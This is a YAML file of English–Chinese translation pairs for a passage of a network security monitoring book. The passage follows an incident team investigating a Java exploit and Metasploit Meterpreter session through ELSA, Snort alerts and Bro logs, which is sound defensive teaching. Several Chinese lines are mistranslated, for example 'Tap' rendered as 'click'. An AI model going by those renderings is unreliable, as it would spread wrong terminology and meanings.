- en: in question can support the additional load. We’ll see if that decision is jus-
  id: totrans-547
  prefs: []
  type: TYPE_NORMAL
  zh: 涉及的网络能够支持额外的负载。我们将看看这个决定是否合理—
- en: tified! The network appears as shown in Figure 11-2\.
  id: totrans-548
  prefs: []
  type: TYPE_NORMAL
  zh: 确认！网络如图 11-2 所示\。
- en: With this sensor configuration, the NSM platform will see traffic both
  id: totrans-549
  prefs: []
  type: TYPE_NORMAL
  zh: 使用此传感器配置，NSM 平台将看到来自
- en: to and from the wireless network and the internal network. (I’ve completely
  id: totrans-550
  prefs: []
  type: TYPE_NORMAL
  zh: 到达无线网络和内部网络之间的数据传输。（我已完全
- en: simulated the network here in order to include the NAT issues discussed
  id: totrans-551
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里模拟了网络，以便包括讨论的 NAT 问题
- en: earlier in the book, but they do not play a major role.)
  id: totrans-552
  prefs: []
  type: TYPE_NORMAL
  zh: 早些时候在书中提到过，但它们并未发挥主要作用。）
- en: Client-side Compromise **237**
  id: totrans-553
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端妥协 **237**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-554
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 132](index-272_1.png)'
  id: totrans-555
  prefs: []
  type: TYPE_IMG
  zh: '![图像 132](index-272_1.png)'
- en: Internet
  id: totrans-556
  prefs: []
  type: TYPE_NORMAL
  zh: 互联网
- en: Tap
  id: totrans-557
  prefs: []
  type: TYPE_NORMAL
  zh: 点击
- en: Wireless
  id: totrans-558
  prefs: []
  type: TYPE_NORMAL
  zh: 无线
- en: Network
  id: totrans-559
  prefs: []
  type: TYPE_NORMAL
  zh: 网络
- en: Tap
  id: totrans-560
  prefs: []
  type: TYPE_NORMAL
  zh: 点击
- en: NSM
  id: totrans-561
  prefs: []
  type: TYPE_NORMAL
  zh: NSM
- en: Laptop
  id: totrans-562
  prefs: []
  type: TYPE_NORMAL
  zh: 笔记本电脑
- en: Internal
  id: totrans-563
  prefs: []
  type: TYPE_NORMAL
  zh: 内部
- en: 172.16.0.37
  id: totrans-564
  prefs: []
  type: TYPE_NORMAL
  zh: 172.16.0.37
- en: Network
  id: totrans-565
  prefs: []
  type: TYPE_NORMAL
  zh: 网络
- en: '*Figure 11-2: Wireless and internal network segments on Vivian’s Pets network*'
  id: totrans-566
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11-2：Vivian’s Pets 网络上的无线和内部网络段*'
- en: '***Getting the Incident Report from a User***'
  id: totrans-567
  prefs: []
  type: TYPE_NORMAL
  zh: '***从用户获取事件报告***'
- en: One afternoon the Vivian’s Pets CIRT receives a call from a concerned user.
  id: totrans-568
  prefs: []
  type: TYPE_NORMAL
  zh: 有一天下午，Vivian’s Pets CIRT 收到了一位担忧的用户来电。
- en: She reports logging in to Twitter and searching for messages to her user-
  id: totrans-569
  prefs: []
  type: TYPE_NORMAL
  zh: 她报告说登录 Twitter 并搜索发给她的消息，
- en: name. She noticed a tweet from an unfamiliar username, *Callbackpnsm*, and
  id: totrans-570
  prefs: []
  type: TYPE_NORMAL
  zh: 名字。她注意到一个来自陌生用户名的推文，*Callbackpnsm*，并
- en: the message was a little unsettling. The unknown tweet mentioned “updates
  id: totrans-571
  prefs: []
  type: TYPE_NORMAL
  zh: 该信息有些让人不安。未知的推文提到“更新
- en: to our health care plan” and provided a link to a site with *healthcarenews*
    in the URL. Curious, she copied and pasted the URL into her Firefox web
  id: totrans-572
  prefs: []
  type: TYPE_NORMAL
  zh: 转发到我们的健康护理计划”并提供了一个包含 *healthcarenews* 的链接。出于好奇，她将该网址复制并粘贴到 Firefox 浏览器中
- en: browser to take a look. Figure 11-3 shows the suspicious tweet.
  id: totrans-573
  prefs: []
  type: TYPE_NORMAL
  zh: 浏览器查看情况。图 11-3 展示了那条可疑的推文。
- en: '*Figure 11-3: Tweet from Cal backpnsm*'
  id: totrans-574
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11-3：来自 Callbackpnsm 的推文*'
- en: When an unknown or suspicious Twitter user sends a link to an un-
  id: totrans-575
  prefs: []
  type: TYPE_NORMAL
  zh: 当一个不明或可疑的 Twitter 用户发送一个链接到一个未
- en: recognized website, most security analysts become nervous. At this point,
  id: totrans-576
  prefs: []
  type: TYPE_NORMAL
  zh: 识别出网站时，大多数安全分析师会感到紧张。此时，
- en: the Vivian’s Pets CIRT suspects that the unfortunate user has fallen for a
  id: totrans-577
  prefs: []
  type: TYPE_NORMAL
  zh: Vivian’s Pets CIRT 怀疑这位不幸的用户已经上当受骗，
- en: '**238** Chapter 11'
  id: totrans-578
  prefs: []
  type: TYPE_NORMAL
  zh: '**238** 第 11 章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-579
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 133](index-273_1.png)'
  id: totrans-580
  prefs: []
  type: TYPE_IMG
  zh: '![图像 133](index-273_1.png)'
- en: client-side attack. The CIRT asks if the user recalls seeing anything suspi-
  id: totrans-581
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端攻击。CIRT 询问用户是否记得看到任何可疑
- en: cious after visiting the URL. The user replies that she saw something about
  id: totrans-582
  prefs: []
  type: TYPE_NORMAL
  zh: 访问网址后，用户回应说她看到了一些关于
- en: a Java installation, and when she clicked through to learn about the health
  id: totrans-583
  prefs: []
  type: TYPE_NORMAL
  zh: 一个 Java 安装程序，当她点击后了解健康
- en: care update, all she saw was a blank page.
  id: totrans-584
  prefs: []
  type: TYPE_NORMAL
  zh: 当她查看健康护理更新时，看到的只是一个空白页面。
- en: The user became worried that something was wrong, so she decided
  id: totrans-585
  prefs: []
  type: TYPE_NORMAL
  zh: 用户开始担心情况不对劲，于是她决定
- en: to turn to the CIRT to get some help. The CIRT thanks the user for her
  id: totrans-586
  prefs: []
  type: TYPE_NORMAL
  zh: 转而求助于 CIRT 获得帮助。CIRT 感谢用户提供的信息
- en: report. It’s time to start investigating!
  id: totrans-587
  prefs: []
  type: TYPE_NORMAL
  zh: 报告。现在是时候开始调查了！
- en: '***Starting Analysis with ELSA***'
  id: totrans-588
  prefs: []
  type: TYPE_NORMAL
  zh: '***使用 ELSA 开始分析***'
- en: One way to begin the analysis process is to query logs for the IP address in
  id: totrans-589
  prefs: []
  type: TYPE_NORMAL
  zh: 开始分析过程的一种方式是查询日志中有关 IP 地址的信息，
- en: the tweet. We’ll start with ELSA.
  id: totrans-590
  prefs: []
  type: TYPE_NORMAL
  zh: 那条推文。我们将从 ELSA 开始。
- en: '**Querying for the IP address**'
  id: totrans-591
  prefs: []
  type: TYPE_NORMAL
  zh: '**查询 IP 地址**'
- en: First, we’ll make sure that the ELSA query time frame begins before the user
  id: totrans-592
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们将确保 ELSA 查询的时间范围开始于用户
- en: experienced the odd activity, and then we’ll add the IP address in question,
  id: totrans-593
  prefs: []
  type: TYPE_NORMAL
  zh: 经历了这一异常活动后，我们将添加相关的 IP 地址，
- en: 203.0.113.15, to the search bar. The results are shown in Figure 11-4\.
  id: totrans-594
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.15，输入到搜索栏。结果如图 11-4 所示\。
- en: '*Figure 11-4: Initial ELSA query results for 203.0.113.15*'
  id: totrans-595
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11-4：203.0.113.15 的初始 ELSA 查询结果*'
- en: ELSA tells us that it has 244 records, but, by default, it limits itself to
  id: totrans-596
  prefs: []
  type: TYPE_NORMAL
  zh: ELSA告诉我们，它有244条记录，但默认情况下，限制为
- en: 100 results. The oldest entry appears first. The results are not encourag-
  id: totrans-597
  prefs: []
  type: TYPE_NORMAL
  zh: 100条结果。最早的条目排在最前面。结果并不令人鼓舞。
- en: ing, with mentions of malicious Java applet and Vulnerable Java Version
  id: totrans-598
  prefs: []
  type: TYPE_NORMAL
  zh: 内容提到恶意Java小程序和检测到的漏洞Java版本1.7.x。
- en: 1.7.x Detected. Seeing 0day JRE 17 metasploit Exploit Class is even worse.
  id: totrans-599
  prefs: []
  type: TYPE_NORMAL
  zh: 看到0day JRE 17 Metasploit Exploit Class更是雪上加霜。
- en: 'Thankfully, we do now have the victim’s IP address: 172.16.0.37\. Rather'
  id: totrans-600
  prefs: []
  type: TYPE_NORMAL
  zh: 幸运的是，我们现在确实找到了受害者的IP地址：172.16.0.37\。然而
- en: Client-side Compromise **239**
  id: totrans-601
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端妥协 **239**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-602
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 134](index-274_1.png)'
  id: totrans-603
  prefs: []
  type: TYPE_IMG
  zh: '![Image 134](index-274_1.png)'
- en: '![Image 135](index-274_2.png)'
  id: totrans-604
  prefs: []
  type: TYPE_IMG
  zh: '![Image 135](index-274_2.png)'
- en: than scroll through multiple pages of output, we select the program element
  id: totrans-605
  prefs: []
  type: TYPE_NORMAL
  zh: 与其滚动浏览多页输出，我们选择程序元素
- en: near the top of the screen to see a summary count of all data sources ELSA
  id: totrans-606
  prefs: []
  type: TYPE_NORMAL
  zh: 在屏幕顶部附近查看所有数据源的摘要计数，ELSA显示
- en: possesses for this IP address. Figure 11-5 shows the result.
  id: totrans-607
  prefs: []
  type: TYPE_NORMAL
  zh: 表示此IP地址的拥有情况。图11-5显示了结果。
- en: '*Figure 11-5: ELSA displays data sources for logs for 203.0.113.15\.*'
  id: totrans-608
  prefs: []
  type: TYPE_NORMAL
  zh: '*图11-5：ELSA显示203.0.113.15的日志数据源。*'
- en: As you can see, Snort alerts dominate the results, although there are
  id: totrans-609
  prefs: []
  type: TYPE_NORMAL
  zh: 如您所见，Snort警报主导了结果，尽管还有
- en: two HTTP records and one Bro connection log record.
  id: totrans-610
  prefs: []
  type: TYPE_NORMAL
  zh: 两个HTTP记录和一个Bro连接日志记录。
- en: '**Checking the Bro HttP Log**'
  id: totrans-611
  prefs: []
  type: TYPE_NORMAL
  zh: '**检查Bro HttP日志**'
- en: Clicking the *bro_http* link provides the results shown in Figure 11-6\.
  id: totrans-612
  prefs: []
  type: TYPE_NORMAL
  zh: 点击*bro_http*链接会显示图11-6中的结果。
- en: '*Figure 11-6: ELSA displays Bro HTTP log records for 203.0.113.15\.*'
  id: totrans-613
  prefs: []
  type: TYPE_NORMAL
  zh: '*图11-6：ELSA显示203.0.113.15的Bro HTTP日志记录。*'
- en: These two events bear the same timestamp in ELSA, but the Bro time-
  id: totrans-614
  prefs: []
  type: TYPE_NORMAL
  zh: 这两个事件在ELSA中具有相同的时间戳，但Bro时间戳
- en: stamp shows that the top request happened first. That seems a little odd,
  id: totrans-615
  prefs: []
  type: TYPE_NORMAL
  zh: 时间戳显示最上面的请求先发生。看起来有点奇怪，
- en: given that it’s a request for *healthcarenews/Exploit.jar.pack.gz*. The second
  id: totrans-616
  prefs: []
  type: TYPE_NORMAL
  zh: 鉴于这是对*healthcarenews/Exploit.jar.pack.gz*的请求，第二
- en: record, with a later timestamp, is for the *healthcarenews* page itself.
  id: totrans-617
  prefs: []
  type: TYPE_NORMAL
  zh: 记录，时间戳较晚，属于*healthcarenews*页面本身。
- en: Seeing a download for content titled *Exploit.jar.pack.gz* doesn’t inspire
  id: totrans-618
  prefs: []
  type: TYPE_NORMAL
  zh: 看到标题为*Exploit.jar.pack.gz*的下载内容并没有激发
- en: confidence. We need to find out what else happened to this victim system.
  id: totrans-619
  prefs: []
  type: TYPE_NORMAL
  zh: 我们需要找到这个受害者系统发生了什么其他情况。
- en: '**Checking Snort alerts**'
  id: totrans-620
  prefs: []
  type: TYPE_NORMAL
  zh: '**检查Snort警报**'
- en: Returning to the first open tab in ELSA, we notice the *sig_msg* link. Clicking
    this link creates a new tab with a summary count of each of the Snort alerts
  id: totrans-621
  prefs: []
  type: TYPE_NORMAL
  zh: 返回到ELSA中的第一个打开的标签页时，我们注意到*sig_msg*链接。点击此链接会打开一个新标签页，显示每个Snort警报的摘要计数。
- en: associated with 203.0.113.15, as shown in Figure 11-7\.
  id: totrans-622
  prefs: []
  type: TYPE_NORMAL
  zh: 与203.0.113.15相关，如图11-7所示\。
- en: The summary of observed Snort signatures includes references to the
  id: totrans-623
  prefs: []
  type: TYPE_NORMAL
  zh: 观察到的Snort签名摘要包括对
- en: Metasploit Meterpreter, including the core_channel and stdapi, with Command
  id: totrans-624
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit Meterpreter，包括core_channel和stdapi，带有命令
- en: Request and Command Response for each. This is not encouraging either.
  id: totrans-625
  prefs: []
  type: TYPE_NORMAL
  zh: 请求和命令响应对每个事件都很不鼓舞人心。
- en: '**240** Chapter 11'
  id: totrans-626
  prefs: []
  type: TYPE_NORMAL
  zh: '**240** 第11章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-627
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 136](index-275_1.png)'
  id: totrans-628
  prefs: []
  type: TYPE_IMG
  zh: '![Image 136](index-275_1.png)'
- en: Metasploit ( *http://www.metasploit.com/*) is an open source reconnaissance
  id: totrans-629
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit (*http://www.metasploit.com/*)是一个开源侦察工具。
- en: and exploitation framework created by HD Moore and now supported by
  id: totrans-630
  prefs: []
  type: TYPE_NORMAL
  zh: 和HD Moore创建的利用框架，现在由
- en: Rapid7 and a team of developers. The Meterpreter is a Metasploit *payload*,
  id: totrans-631
  prefs: []
  type: TYPE_NORMAL
  zh: Rapid7和开发团队。Meterpreter是一个Metasploit *有效载荷*，
- en: code used by an attacker after initially gaining access to a target using an
  id: totrans-632
  prefs: []
  type: TYPE_NORMAL
  zh: 代码是攻击者在初步获得目标访问权限后使用的。
- en: exploit delivered by another Metasploit module. Terms like core_channel and
  id: totrans-633
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个Metasploit模块交付的漏洞的引用。像core_channel这样的术语
- en: stdapi refer to functions and features in the Metasploit suite, and Command
  id: totrans-634
  prefs: []
  type: TYPE_NORMAL
  zh: stdapi指的是Metasploit套件中的功能和特性，而命令
- en: Request and Command Response indicate communication between the attacker’s
  id: totrans-635
  prefs: []
  type: TYPE_NORMAL
  zh: 请求和命令响应表示攻击者与受害者之间的通信。
- en: system and the victim.
  id: totrans-636
  prefs: []
  type: TYPE_NORMAL
  zh: 系统和受害者。
- en: '*Figure 11-7: ELSA displays a summary of Snort signatures for 203.0.113.15\.*'
  id: totrans-637
  prefs: []
  type: TYPE_NORMAL
  zh: '*图11-7：ELSA显示203.0.113.15的Snort签名摘要。*'
- en: The intruder appears to have gained the ability to execute code on the
  id: totrans-638
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者似乎已经获得了在目标上执行代码的能力。
- en: victim via a Java exploit.
  id: totrans-639
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者通过Java漏洞受到攻击。
- en: '**Searching for Other activity**'
  id: totrans-640
  prefs: []
  type: TYPE_NORMAL
  zh: '**搜索其他活动**'
- en: Next, we need to determine if this intruder interacted with any other systems.
  id: totrans-641
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们需要确定这个入侵者是否与其他系统有过互动。
- en: To accomplish that task, we return to the first tab with all the information
    for
  id: totrans-642
  prefs: []
  type: TYPE_NORMAL
  zh: 为了完成这项任务，我们返回到第一个包含所有信息的标签页。
- en: 203.0.113.15 and click the *srcip* link. ELSA tells us that only 203.0.113.15
    and 172.16.0.37 have records associated with 203.0.113.15, but for good measure,
  id: totrans-643
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.15 并点击 *srcip* 链接。ELSA 告诉我们，只有 203.0.113.15 和 172.16.0.37 有与 203.0.113.15
    相关的记录，但为了确保准确，
- en: we also click the *dstip* link and get the same results. That means we probably
    have a handle on all activity involving 203.0.113.15—that IP address did not
  id: totrans-644
  prefs: []
  type: TYPE_NORMAL
  zh: 我们也点击 *dstip* 链接并得到相同的结果。这意味着我们可能已经掌握了所有涉及 203.0.113.15 的活动——该 IP 地址并没有
- en: communicate with any other system we watch.
  id: totrans-645
  prefs: []
  type: TYPE_NORMAL
  zh: 通信的其他系统记录。
- en: Still, that result doesn’t mean that no other activity affected the victim,
  id: totrans-646
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，这个结果并不意味着没有其他活动影响到受害者，
- en: 172.16.0.37\. To investigate that lead, we run a new ELSA query for 172.16.0.37
  id: totrans-647
  prefs: []
  type: TYPE_NORMAL
  zh: 172.16.0.37。为了调查这个线索，我们为 172.16.0.37 运行了一个新的 ELSA 查询。
- en: and then click the *program* link to get a summary count of records. We need
  id: totrans-648
  prefs: []
  type: TYPE_NORMAL
  zh: 然后点击 *program* 链接以获取记录的汇总计数。我们需要
- en: to know what other connections 172.16.0.37 conducted. Figure 11-8 shows
  id: totrans-649
  prefs: []
  type: TYPE_NORMAL
  zh: 需要知道 172.16.0.37 进行的其他连接。图 11-8 显示了
- en: the results.
  id: totrans-650
  prefs: []
  type: TYPE_NORMAL
  zh: 结果显示。
- en: We take a similar approach to investigating these logs. First, we check
  id: totrans-651
  prefs: []
  type: TYPE_NORMAL
  zh: 我们采用类似的方法来调查这些日志。首先，我们检查
- en: out the Snort alerts, summarize them, and look for new information. Nothing
  id: totrans-652
  prefs: []
  type: TYPE_NORMAL
  zh: 排除 Snort 警报，总结它们，并寻找新信息。没有发现
- en: new appears here, except we see Snort alerts for package management,
  id: totrans-653
  prefs: []
  type: TYPE_NORMAL
  zh: 新的条目出现在这里，除了我们看到与包管理相关的 Snort 警报，
- en: probably due to system updates.
  id: totrans-654
  prefs: []
  type: TYPE_NORMAL
  zh: 可能是由于系统更新所致。
- en: Client-side Compromise **241**
  id: totrans-655
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端妥协 **241**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-656
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 137](index-276_1.png)'
  id: totrans-657
  prefs: []
  type: TYPE_IMG
  zh: '![Image 137](index-276_1.png)'
- en: '![Image 138](index-276_2.png)'
  id: totrans-658
  prefs: []
  type: TYPE_IMG
  zh: '![Image 138](index-276_2.png)'
- en: '*Figure 11-8: ELSA displays data sources for logs for 172.16.0.37\.*'
  id: totrans-659
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11-8：ELSA 显示 172.16.0.37 的日志数据源。*'
- en: Next, we look at the dstip information and get results, as shown in
  id: totrans-660
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们查看 dstip 信息并得到结果，如下所示
- en: Figure 11-9\. (I’ve snipped the results to concentrate on the most pertinent
  id: totrans-661
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11-9。 （我已剪切结果，以集中显示最相关的部分）
- en: information.)
  id: totrans-662
  prefs: []
  type: TYPE_NORMAL
  zh: 信息。)
- en: '*Figure 11-9: ELSA displays a summary of dstip entries for 172.16.0.37\.*'
  id: totrans-663
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11-9：ELSA 显示 172.16.0.37 的 dstip 条目汇总。*'
- en: One entry catches our attention. The bottom record shows 10.0.0.99, an
  id: totrans-664
  prefs: []
  type: TYPE_NORMAL
  zh: 有一条记录引起了我们的注意。底部的记录显示了 10.0.0.99，一个
- en: IP address in the Vivian’s Pets internal network. That means there were five
  id: totrans-665
  prefs: []
  type: TYPE_NORMAL
  zh: Vivian’s Pets 内部网络中的 IP 地址。这意味着有五个
- en: connections between 172.16.0.37 and 10.0.0.99\. Are these legitimate? Could
  id: totrans-666
  prefs: []
  type: TYPE_NORMAL
  zh: 172.16.0.37 和 10.0.0.99 之间的连接。它们合法吗？能否
- en: one or more be caused by an intruder abusing 172.16.0.37?
  id: totrans-667
  prefs: []
  type: TYPE_NORMAL
  zh: 一个或多个可能是入侵者滥用 172.16.0.37 所导致？
- en: Clicking the IP address 10.0.0.99 tells ELSA to query for records where
  id: totrans-668
  prefs: []
  type: TYPE_NORMAL
  zh: 点击 IP 地址 10.0.0.99 会让 ELSA 查询所有与
- en: 10.0.0.99 was the destination IP address and 172.16.0.37 was the source IP
  id: totrans-669
  prefs: []
  type: TYPE_NORMAL
  zh: 10.0.0.99 是目标 IP 地址，172.16.0.37 是源 IP
- en: address. Figure 11-10 shows the results.
  id: totrans-670
  prefs: []
  type: TYPE_NORMAL
  zh: 地址。图 11-10 显示了结果。
- en: These records show three SSH connections. All three appear in the
  id: totrans-671
  prefs: []
  type: TYPE_NORMAL
  zh: 这些记录显示了三次 SSH 连接。所有三次连接都出现在
- en: Bro *conn.log* file, and two appear as “heuristic detections” in the Bro *notice.log*
    file. These connections could involve transfers of data via a program like
  id: totrans-672
  prefs: []
  type: TYPE_NORMAL
  zh: Bro *conn.log* 文件中有两条记录出现在 Bro *notice.log* 文件中的“启发式检测”中。这些连接可能涉及通过像
- en: Secure Copy (scp) or interactive logins using SSH. It’s probably worth look-
  id: totrans-673
  prefs: []
  type: TYPE_NORMAL
  zh: 安全复制（scp）或使用 SSH 进行的交互式登录。可能值得看一下
- en: ing for all activity involving 10.0.0.9, so we run a new query (not shown)
  id: totrans-674
  prefs: []
  type: TYPE_NORMAL
  zh: 查询所有涉及 10.0.0.9 的活动，因此我们运行了一个新的查询（未显示）
- en: '**242** Chapter 11'
  id: totrans-675
  prefs: []
  type: TYPE_NORMAL
  zh: '**242** 第 11 章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-676
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 139](index-277_1.png)'
  id: totrans-677
  prefs: []
  type: TYPE_IMG
  zh: '![Image 139](index-277_1.png)'
- en: for only that IP address, and group the results by program. They show
  id: totrans-678
  prefs: []
  type: TYPE_NORMAL
  zh: 只针对该 IP 地址查询，并按程序分组结果。它们显示了
- en: 121 Snort alerts, 23 *conn.log* entries, 18 *dns.log* entries, 2 *notice.log*
    entries, and 1 *http.log* entry.
  id: totrans-679
  prefs: []
  type: TYPE_NORMAL
  zh: 121 个 Snort 警报，23 条 *conn.log* 记录，18 条 *dns.log* 记录，2 条 *notice.log* 记录，和 1
    条 *http.log* 记录。
- en: Using the same investigative steps, we query each of the log types for any-
  id: totrans-680
  prefs: []
  type: TYPE_NORMAL
  zh: 使用相同的调查步骤，我们查询每种日志类型的任何-
- en: thing interesting. All of the Snort alerts for 10.0.0.9 appear to be related
    to
  id: totrans-681
  prefs: []
  type: TYPE_NORMAL
  zh: 有趣的事情。所有与 10.0.0.9 相关的 Snort 警报似乎都与
- en: package management, as do the Bro log entries for the rest of the activity.
  id: totrans-682
  prefs: []
  type: TYPE_NORMAL
  zh: 包管理，其他活动的 Bro 日志条目也显示了类似内容。
- en: Is that the end of the case? Was 172.16.0.37 the only victim, and the
  id: totrans-683
  prefs: []
  type: TYPE_NORMAL
  zh: 这是案件的结束吗？172.16.0.37 是唯一的受害者，还是
- en: SSH connections to 10.0.0.9 normal business activity? Could our NSM plat-
  id: totrans-684
  prefs: []
  type: TYPE_NORMAL
  zh: SSH 连接到 10.0.0.9 是正常的商业活动吗？我们的 NSM 平台-
- en: form have missed something?
  id: totrans-685
  prefs: []
  type: TYPE_NORMAL
  zh: 形式上有遗漏的地方？
- en: '*Figure 11-10: ELSA displays Bro log records for source IP 172.16.0.37 and
    destination IP 10.0.0.9\.*'
  id: totrans-686
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11-10: ELSA 显示源 IP 172.16.0.37 和目标 IP 10.0.0.9 的 Bro 日志记录。*'
- en: '***Looking for Missing Traffic***'
  id: totrans-687
  prefs: []
  type: TYPE_NORMAL
  zh: '***查找丢失的流量***'
- en: At this point, we suspect that something may be wrong, and we want to
  id: totrans-688
  prefs: []
  type: TYPE_NORMAL
  zh: 在此时，我们怀疑可能有问题，并希望
- en: make sure that the NSM platform is performing as expected. Is our system
  id: totrans-689
  prefs: []
  type: TYPE_NORMAL
  zh: 确保 NSM 平台按预期运行。我们的系统
- en: up to the task of watching two segments? Could it be dropping traffic?
  id: totrans-690
  prefs: []
  type: TYPE_NORMAL
  zh: 负责监视两个段落的任务吗？是否有可能丢失流量？
- en: One way to answer these questions is to check Bro’s *capture_loss.log*, which
  id: totrans-691
  prefs: []
  type: TYPE_NORMAL
  zh: 一种回答这些问题的方法是检查 Bro 的 *capture_loss.log*，它
- en: reports on Bro’s packet-capture performance. Listing 11-1 shows the contents
  id: totrans-692
  prefs: []
  type: TYPE_NORMAL
  zh: 报告 Bro 的数据包捕获性能。列表 11-1 显示了内容
- en: of the log at the time of this incident.
  id: totrans-693
  prefs: []
  type: TYPE_NORMAL
  zh: 这是该事件发生时日志的一部分。
- en: $ **cat /nsm/bro/logs/current/capture_loss.log**
  id: totrans-694
  prefs: []
  type: TYPE_NORMAL
  zh: $ **cat /nsm/bro/logs/current/capture_loss.log**
- en: '#separator \x09'
  id: totrans-695
  prefs: []
  type: TYPE_NORMAL
  zh: '#separator \x09'
- en: '#set_separator ,'
  id: totrans-696
  prefs: []
  type: TYPE_NORMAL
  zh: '#set_separator ,'
- en: '#empty_field (empty)'
  id: totrans-697
  prefs: []
  type: TYPE_NORMAL
  zh: '#empty_field (空)'
- en: '#unset_field -'
  id: totrans-698
  prefs: []
  type: TYPE_NORMAL
  zh: '#unset_field -'
- en: '#path capture_loss'
  id: totrans-699
  prefs: []
  type: TYPE_NORMAL
  zh: '#path capture_loss'
- en: '#open 2013-03-16-15-02-50'
  id: totrans-700
  prefs: []
  type: TYPE_NORMAL
  zh: '#open 2013-03-16-15-02-50'
- en: '#fields ts ts_delta peer gaps acks percent_lost'
  id: totrans-701
  prefs: []
  type: TYPE_NORMAL
  zh: '#fields ts ts_delta peer gaps acks percent_lost'
- en: '#types time interval string count count string'
  id: totrans-702
  prefs: []
  type: TYPE_NORMAL
  zh: '#types 时间间隔 字符串 数量 数量 字符串'
- en: Client-side Compromise **243**
  id: totrans-703
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端妥协 **243**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-704
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 1363446165.986403 900.000429 sovm-eth2-1 0 0 0.000%
  id: totrans-705
  prefs: []
  type: TYPE_NORMAL
  zh: 1363446165.986403 900.000429 sovm-eth2-1 0 0 0.000%
- en: 1363446165.992449 900.000470 sovm-eth1-1 0 0 0.000%
  id: totrans-706
  prefs: []
  type: TYPE_NORMAL
  zh: 1363446165.992449 900.000470 sovm-eth1-1 0 0 0.000%
- en: 1363447065.986807 900.000404 sovm-eth2-1 17963 19964 u89.977%
  id: totrans-707
  prefs: []
  type: TYPE_NORMAL
  zh: 1363447065.986807 900.000404 sovm-eth2-1 17963 19964 u89.977%
- en: 1363447065.992765 900.000316 sovm-eth1-1 0 0 0.000%
  id: totrans-708
  prefs: []
  type: TYPE_NORMAL
  zh: 1363447065.992765 900.000316 sovm-eth1-1 0 0 0.000%
- en: '*Listing 11-1: Bro* capture_loss .log'
  id: totrans-709
  prefs: []
  type: TYPE_NORMAL
  zh: '*Listing 11-1: Bro* capture_loss .log'
- en: The second-to-last entry at u is shocking. It shows that Bro dropped
  id: totrans-710
  prefs: []
  type: TYPE_NORMAL
  zh: u 处的倒数第二项条目令人震惊。它显示 Bro 丢失了
- en: 89.977 percent of the traffic seen on the second sniffing sensor interface.
  id: totrans-711
  prefs: []
  type: TYPE_NORMAL
  zh: 89.977% 的流量是在第二个嗅探传感器接口上看到的。
- en: That could be devastating! (Bro may have run out of memory trying to
  id: totrans-712
  prefs: []
  type: TYPE_NORMAL
  zh: 这可能是灾难性的！(Bro 可能因为内存不足而尝试运行失败)
- en: track a lot of network activity on an underpowered sensor.)
  id: totrans-713
  prefs: []
  type: TYPE_NORMAL
  zh: 跟踪在资源有限的传感器上大量的网络活动。)
- en: When monitoring a live interface, Bro must make decisions about which
  id: totrans-714
  prefs: []
  type: TYPE_NORMAL
  zh: 当监控实时接口时，Bro 必须做出决定，选择哪些
- en: traffic to inspect and which traffic to ignore, simply to try to keep pace with
  id: totrans-715
  prefs: []
  type: TYPE_NORMAL
  zh: 检查哪些流量需要检查，哪些流量需要忽略，基本上是为了尽量跟上
- en: the live packet stream. When run against a saved trace, Bro has more time
  id: totrans-716
  prefs: []
  type: TYPE_NORMAL
  zh: 实时数据流。运行在已保存的跟踪数据上时，Bro 有更多时间
- en: for processing packets, perhaps offering a more thorough analysis.
  id: totrans-717
  prefs: []
  type: TYPE_NORMAL
  zh: 用于处理数据包，也许提供了更深入的分析。
- en: Remember that one of the tenets of NSM is to use multiple tools for
  id: totrans-718
  prefs: []
  type: TYPE_NORMAL
  zh: 记住，NSM 的一个原则是使用多种工具进行
- en: collection and analysis, so if one tool fails, different sources of data may
  id: totrans-719
  prefs: []
  type: TYPE_NORMAL
  zh: 收集和分析数据，因此如果一个工具失败，其他数据源可能
- en: still help you determine what happened. Checking the */nsm/sensor_data/*
  id: totrans-720
  prefs: []
  type: TYPE_NORMAL
  zh: 仍然帮助你确定发生了什么。检查 */nsm/sensor_data/*
- en: '*sovm-eth2/dailylogs/2013-03-16* directory on the NSM platform, we find the'
  id: totrans-721
